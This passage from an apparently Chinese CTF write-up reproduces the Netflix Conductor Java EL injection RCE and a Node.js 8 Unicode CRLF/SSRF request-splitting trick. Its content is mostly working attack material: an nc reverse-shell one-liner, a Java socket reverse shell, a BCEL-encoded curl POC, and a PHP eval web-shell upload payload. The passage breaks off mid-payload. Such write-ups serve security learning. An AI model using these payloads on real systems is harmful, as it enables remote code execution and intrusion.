title="漏洞分析"></a>漏洞分析</h4><p>先搭建一下环境，复现一下</p><p>回到上面的 <a href="https://xz.aliyun.com/t/7889">https://xz.aliyun.com/t/7889</a> 链接</p><blockquote><p>Netflix Conductor uses Java Bean Validation (JSR 380) custom constraint validators. When building custom constraint violation error messages, different types of interpolation are supported, including Java EL expressions. If an attacker can inject arbitrary data in the error message template being passed to ConstraintValidatorContext.buildConstraintViolationWithTemplate() argument, they will be able to run arbitrary Java code.</p><p>本次漏洞成因在于自定义约束冲突时的错误信息支持了 Java EL 表达式。如果攻击者可以控制ConstraintValidatorContext.buildConstraintViolationWithTemplate() 函数的参数，那么可以通过注入 Java EL 表达式进行任意代码执行。</p></blockquote><p>源码代码下载：<a href="https://codeload.github.com/Netflix/conductor/zip/refs/tags/v2.25.0">https://codeload.github.com/Netflix/conductor/zip/refs/tags/v2.25.0</a></p><p>全局搜一下 <code>buildConstraintViolationWithTemplate(</code> 发现多处有用到，并且参数利用 <code>String.format(0)</code> 生成的格式化字符串，格式化过程中存在用户可控的变量 <code>taskDef.getName()</code> 至于怎么发现的 <code>TaskTimeoutConstraint.java</code> 文件存在可利用点，可能排查起来就需要些时间和耐心了，这里跟着来先。</p><p><img src="/img/2021hfctf/image-20210422185124957.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422185124957.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422185124957"></p><p>下一步继续关注 <code>TaskTimeoutConstraint.java</code> 在哪被使用，定位到 <code>common/src/main/java/com/netflix/conductor/common/metadata/tasks/TaskDef.java</code> 文件，其实也有多处引用，。找漏洞利用点的大佬辛苦了~</p><p><img src="/img/2021hfctf/image-20210422185744001.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422185744001.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422185744001"></p><p>可以看到 <code>TaskTimeoutConstraint</code> 注解到了 <code>TaskDef</code> 类上，那么下一步进行看 <code>TaskDef</code> 类会在哪里被使用，继续搜索全局引用，可以看到 <code>jersey/src/main/java/com/netflix/conductor/server/resources/MetadataResource.java</code> 会<br>把该类和路由 <code>/api/metadata/taskdefs</code> 绑定，即我们通过请求该路由，即可获得 <code>TaskDef</code> 对象。</p><p><img src="/img/2021hfctf/image-20210422190049360.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422190049360.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422190049360"></p><p><a href="https://netflix.github.io/conductor/labs/beginner/">https://netflix.github.io/conductor/labs/beginner/</a></p><p>官方给出的访问 API 稍微修改后如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST \</span><br><span class="line">  http://localhost:8080/api/metadata/taskdefs \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;[</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;name&quot;: &quot;verify_if_idents_are_added&quot;,</span></span><br><span class="line"><span class="string">      &quot;retryCount&quot;: 3,</span></span><br><span class="line"><span class="string">      &quot;retryLogic&quot;: &quot;FIXED&quot;,</span></span><br><span class="line"><span class="string">      &quot;retryDelaySeconds&quot;: 10,</span></span><br><span class="line"><span class="string">      &quot;timeoutSeconds&quot;: 180,</span></span><br><span class="line"><span class="string">      &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;,</span></span><br><span class="line"><span class="string">      &quot;responseTimeoutSeconds&quot;: 300,</span></span><br><span class="line"><span class="string">      &quot;ownerEmail&quot;: &quot;type your email here&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">]&#x27;</span></span><br></pre></td></tr></table></figure><p>所以漏洞最终的利用逻辑如下：</p><ol><li>通过 POST 请求访问 URL <code>/api/metadata/taskdefs</code> 创建 <code>TaskDef</code> 对象</li><li>根据官方API给出的demo稍微修改后，参数中的 <code>timeoutSeconds</code> 和 <code>responseTimeoutSeconds</code> 满足了 <code>taskDef.getTimeoutSeconds() &gt; 0</code> 以及 <code>taskDef.getResponseTimeoutSeconds() &gt; taskDef.getTimeoutSeconds()</code> 这两个条件，<code>TaskTimeoutValidator</code> 校验失败，<code>TaskDef</code> 的 <code>name</code> 属性作为错误信息的一部分通过 <code>buildConstraintViolationWithTemplate(0)</code> 输出</li><li>由于 <code>name</code> 是我们构造好的 Java EL 表达式，所以最后该表达式会被执行，进而成功触发远程代码执行</li></ol><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>还自带 docker-compose.yaml 也太贴心了吧 （</p><p>由于刚刚下载的就是2.25.0版本，所以直接切到 docker 目录，在 up 一下就好</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> docker</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>如果期间有下载错误啥的，可以尝试代理或者 up 多几下。</p><h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><p>无论下面是自己写 BCEL 还是 直接用现有的工具，都要注意 Java的版本，我本地用的是 1.8.0_144 版本。</p><p>这里还篇有趣的文章，<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了</a> ，我感觉和这个有关，2333</p><p>据网上看，好像保证 Java 版本 &lt; Java 8u261 即可。</p><h5 id="自己写一个，熟悉一下BCEL"><a href="#自己写一个，熟悉一下BCEL" class="headerlink" title="自己写一个，熟悉一下BCEL"></a>自己写一个，熟悉一下BCEL</h5><p>依赖下载地址：</p><p><a href="https://jar-download.com/artifacts/org.apache.servicemix.bundles/org.apache.servicemix.bundles.jaxp-ri/1.4.5_1/">https://jar-download.com/artifacts/org.apache.servicemix.bundles/org.apache.servicemix.bundles.jaxp-ri/1.4.5_1/</a></p><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JavaClass cls = Repository.lookupClass(Exp.class);</span><br><span class="line">        String code = Utility.encode(cls.getBytes(), <span class="keyword">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span> + code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exp.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;监听IP&gt; &lt;监听端口&gt; &gt;/tmp/f&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个POC我在本机可以打成功，但是通过 curl 打实际docker环境 shell 就反弹不回来，然后也试了各种方法 sh 反弹方法，毕竟是 docker最简环境嘛，一般里面除了 sh 能用其他基本没啥了。</p><p>然后突然想起之前看到这篇<a href="https://mp.weixin.qq.com/s/8f80Fezs86DD9R1iRqLhMg">酒仙桥的文章</a>，他遇到的情形和我一样。然后通过 java 编写 socket 的思路来反弹shell，这样可以不依赖于具体的系统环境。</p><p>真 Exp.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String host=<span class="string">&quot;&quot;</span>; <span class="comment">// // nc监听IP</span></span><br><span class="line">        <span class="keyword">int</span> port=; <span class="comment">// nc监听端口，注意是整型不是字符串</span></span><br><span class="line">        String cmd=<span class="string">&quot;/bin/sh&quot;</span>; <span class="comment">// 如果是 windows 就换成 cmd.exe</span></span><br><span class="line">        Process p=<span class="keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="keyword">true</span>).start();</span><br><span class="line">        Socket s=<span class="keyword">new</span> Socket(host,port);</span><br><span class="line">        InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();</span><br><span class="line">        OutputStream po=p.getOutputStream(),so=s.getOutputStream();</span><br><span class="line">        <span class="keyword">while</span>(!s.isClosed())&#123;</span><br><span class="line">            <span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)</span><br><span class="line">                so.write(pi.read());</span><br><span class="line">            <span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)</span><br><span class="line">                so.write(pe.read());</span><br><span class="line">            <span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)</span><br><span class="line">                po.write(si.read());</span><br><span class="line">            so.flush();</span><br><span class="line">            po.flush();</span><br><span class="line">            Thread.sleep(<span class="number">50</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                p.exitValue();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        p.destroy();</span><br><span class="line">        s.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然可以不反弹shell，可以通过 wget 之类的方式下载到本地在加载，</p><p>不过就是想复现一下，万一以后遇到了 HTTP 不出网呢 （</p><p>结构如下</p><p><img src="/img/2021hfctf/image-20210423151406429.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210423151406429.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210423151406429"></p><p>BCEL编码后的恶意代码</p><p><img src="/img/2021hfctf/image-20210423151446165.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210423151446165.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210423151446165"></p><h5 id="直接用现有工具"><a href="#直接用现有工具" class="headerlink" title="直接用现有工具"></a>直接用现有工具</h5><p><a href="https://github.com/f1tz/BCELCodeman">https://github.com/f1tz/BCELCodeman</a></p><p>也是先写好 exp，然后 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exp.java -d /tmp/Exp.class</span><br></pre></td></tr></table></figure><p>BCEL编码后的恶意代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar BCELCodeman.jar e /tmp/Exp.class</span><br></pre></td></tr></table></figure><p><img src="/img/2021hfctf/image-20210423150859893.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210423150859893.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210423150859893"></p><h5 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h5><p>得到编码后构造 POC ，主要是替换 name 部分为 EL表达式，内容为 <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> 加载器加载BCEL编码后的恶意代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST \</span><br><span class="line">  http://localhost:8080/api/metadata/taskdefs \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;[</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;name&quot;: &quot;$&#123;&#x27;</span>\<span class="string">&#x27;&#x27;</span> <span class="string">&#x27;\&#x27;</span><span class="string">&#x27;.getClass().forName(&#x27;</span>\<span class="string">&#x27;&#x27;</span>com.sun.org.apache.bcel.internal.util.ClassLoader<span class="string">&#x27;\&#x27;</span><span class="string">&#x27;).newInstance().loadClass(&#x27;</span>\<span class="string">&#x27;&#x27;</span>&lt;刚刚生成的BCEL编码&gt;<span class="string">&#x27;\&#x27;</span><span class="string">&#x27;).newInstance().class&#125;&quot;,</span></span><br><span class="line"><span class="string">  &quot;ownerEmail&quot;: &quot;test@example.org&quot;,</span></span><br><span class="line"><span class="string">      &quot;retryCount&quot;: 3,</span></span><br><span class="line"><span class="string">      &quot;retryLogic&quot;: &quot;FIXED&quot;,</span></span><br><span class="line"><span class="string">      &quot;retryDelaySeconds&quot;: 10,</span></span><br><span class="line"><span class="string">      &quot;timeoutSeconds&quot;: 180,</span></span><br><span class="line"><span class="string">      &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;,</span></span><br><span class="line"><span class="string">      &quot;responseTimeoutSeconds&quot;: 300,</span></span><br><span class="line"><span class="string">      &quot;ownerEmail&quot;: &quot;type your email here&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">]&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/2021hfctf/image-20210423162810488.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210423162810488.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210423162810488"></p><p>成功反弹shell</p><p><img src="/img/2021hfctf/image-20210423162419172.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210423162419172.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210423162419172"></p><blockquote><p>根据漏洞相关的 pull requests：<a href="https://github.com/Netflix/conductor/pull/1543">https://github.com/Netflix/conductor/pull/1543</a> 可以定位对该漏洞的修复</p><p>开发者将 <code>org.hibernate:hibernate-validator</code> 替换为了 <code>org.apache.bval:bval-jsr</code>，而后者在最新版本下不会解析 Java EL 表达式，所以也不会有 RCE 的危险。</p></blockquote><p>好，本地复现成功，把这个 POC 直接打线上，估计问题不大</p><h3 id="回到题目中"><a href="#回到题目中" class="headerlink" title="回到题目中"></a>回到题目中</h3><p>现在漏洞是可以尝试去利用了，问题是，题目只提供 GET 的代理，无法发送 POST 请求。</p><p>继续沿着一开始的思路走，CRLF SSRF</p><p>guguru了一下，nodejs CRLF 漏洞，发现还真有2333</p><p>这篇写的比较详细，跟着复现一下</p><p><a href="https://mp.weixin.qq.com/s/X6dq1WsKcEjNVwSJKiBMvA">https://mp.weixin.qq.com/s/X6dq1WsKcEjNVwSJKiBMvA</a></p><p>然后看了别人的复现，发现有一个比较隐秘的提示。。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> salt = <span class="string">&#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;</span></span><br></pre></td></tr></table></figure><p>中间藏了个 8，， nodejs8 is best，2333 不过不伤大雅，眼睛不好网上搜一下也可以知道 nodejs HTTP库包含了阻止CRLF的措施，普通 CRLF不管用，但可以通过 nodejs 的设计不严谨问题来绕过。当然这个问题在 nodejs10 被修复了，如果请求路径包含非Ascii字符，则会抛出错误。</p><h3 id="nodejs-lt-9版本-CRLF注入"><a href="#nodejs-lt-9版本-CRLF注入" class="headerlink" title="nodejs &lt; 9版本 CRLF注入"></a>nodejs &lt; 9版本 CRLF注入</h3><p>对于 Node.js v8 或更低版本，如果有下列情况，任何发出HTTP请求的服务器都可能受到通过请求拆实现的SSRF的攻击：</p><ul><li>接受来自用户输入的Unicode数据</li><li>并将其包含在HTTP请求的路径中</li><li>且请求具有一个0长度的主体（比如一个 <code>GET</code> 或者 <code>DELETE</code>）</li></ul><p>由于本机是 node10+，所以docker拉个镜像，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull node:8.8.0-alpine</span><br></pre></td></tr></table></figure><p>进入容器的node环境，然后试试普通的 CRLF</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ # node</span><br><span class="line">&gt; <span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line">&gt; http.get(<span class="string">&#x27;http://192.168.123.37:2233/\r\nwhoami&#x27;</span>).output</span><br><span class="line">[ <span class="string">&#x27;GET /%0D%0Awhoami HTTP/1.1\r\nHost: 192.168.123.37:2233\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure><p>返回包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -lv 0.0.0.0 2233</span><br><span class="line">GET /%0D%0Awhoami HTTP/1.1</span><br><span class="line">Host: 192.168.123.37:2233</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>nodejs Unicode 字符损失原理</p><p>当 Node.js v8 或更低版本对URL发出的 <code>GET</code> 请求进行处理时，它不会进行编码转义，因为它们不是HTTP控制字符，但HTTP请求返回的结果中会被编码为 <code>latin1</code> 编码写入路径，但 latin1 编码为单字节编码（编码范围为 <code>0x00</code> - <code>0xFF</code> ，其中 <code>0x00</code> - <code>0x7F</code>之间完全和ASCII一致，<code>0x80</code> - <code>0x9F</code>之间是控制字符，<code>0xA0</code> - 0xFF之间是文字符号 ），如果此时我们用单字节 8位 Unicode 编码，那么高 4 位会被截断。</p><p>构造请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(<span class="string">&#x27;http://192.168.123.37:2233/\u&#123;220D&#125;\u&#123;330A&#125;tari&#x27;</span>).output</span><br><span class="line">[ <span class="string">&#x27;GET /∍㌊tari HTTP/1.1\r\nHost: 192.168.123.37:2233\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure><p>返回包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -lv 0.0.0.0 2233</span><br><span class="line">GET /</span><br><span class="line">tari HTTP/1.1</span><br><span class="line">Host: 192.168.123.37:2233</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>观察 <code>\u&#123;220D&#125;</code> 和 <code>\u&#123;330A&#125;</code> ，其中 <code>22</code> 和 <code>33</code> 随意，什么都行，因为最终高 4 位都会被截断，然后 <code>0D</code> 和 <code>0A</code> 分别为 <code>\r</code> 和 <code>\n</code> 的 ASCII码，然后Latin1是向下兼容ASCII码的，所以返回包被 <code>\r\n</code> 截断了， <code>tari</code> 变在第二行</p><p>可见，可以通过构造 Unicode字符，在 nodejs 实现 CRLF注入。</p><p>在实际使用时，因为 CRLF + SSRF 点 在 HTTP 状态行，所以要注意闭合原有的状态行中的 <code>HTTP/1.1</code>，即保证注入后有正常的 HTTP 状态行，</p><p>先举个例子，假设目标主机存在SSRF，需要我们在目标主机本地上传文件。我们需要尝试构造如下这个文件上传的完整 POST 请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>437</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=nk67astv61hqanskkddslkgst4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="php">Content-Disposition: form-data; name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="number">100000</span></span></span><br><span class="line"><span class="php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="php">Content-Disposition: form-data; name=<span class="string">&quot;uploaded&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">Upload</span></span><br><span class="line"><span class="php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br></pre></td></tr></table></figure><p>为了方便，我们将这个POST请求里面的所有的字符包括控制符全部用上述的高编号Unicode码表示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /upload.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 437</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; 